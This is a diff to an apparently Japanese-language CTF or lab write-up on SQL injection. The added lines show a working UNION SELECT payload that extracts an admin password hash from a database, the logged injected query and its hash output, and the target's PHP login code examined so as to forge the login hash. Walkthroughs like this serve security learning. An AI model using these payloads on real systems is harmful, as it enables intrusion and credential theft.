@@ -144,4 +144,36 @@ insertとselectでは違う構文でInjectionする必要があるが、その�
 ```
 ![image](https://user-images.githubusercontent.com/56021519/112277693-58ba9180-8cc5-11eb-8050-3ecbb620046d.png)  
 
+以下でpasswordをゲット！  
+```txt
+' union select 1,2,(select password from admin where id=1)#
+
+                   113 Query    SELECT * FROM user_log WHERE username = '' union select 1,2,(select password from admin where id=1)#'
+
+21ffccddf815587ff8149a8efb1a5d86ac295d19
+```
+
+![image](https://user-images.githubusercontent.com/56021519/112279502-56f1cd80-8cc7-11eb-88ae-62be052cb08d.png)  
+ログインは以下のようになっているため、`SHA1(CONCAT(password, '$passtoken'))`は計算できる！  
+```php
+<?php
+   include("config.php");
+   
+   session_start();
+   if (isset($_POST['token']))   
+   {   
+    $_SESSION['token'] = $_POST['token'];   
+   }   
+    else{
+        if (!isset($_SESSION['token']))   
+        $_SESSION['token'] = sha1(mt_rand() . microtime(TRUE));
+    }
+   if($_SERVER["REQUEST_METHOD"] == "POST") {     
+      // username and password sent from form 
+      if(isset($_POST['username'])){
+          $myusername = mysqli_real_escape_string($db,$_POST['username']);
+          $mypassword = mysqli_real_escape_string($db,$_POST['form_password_hidden']); 
+          $passtoken = $_SESSION['token'];
+          $sql = "SELECT id FROM users WHERE username = '$myusername' and SHA1(CONCAT(password, '$passtoken'))='$mypassword'";
+```
 
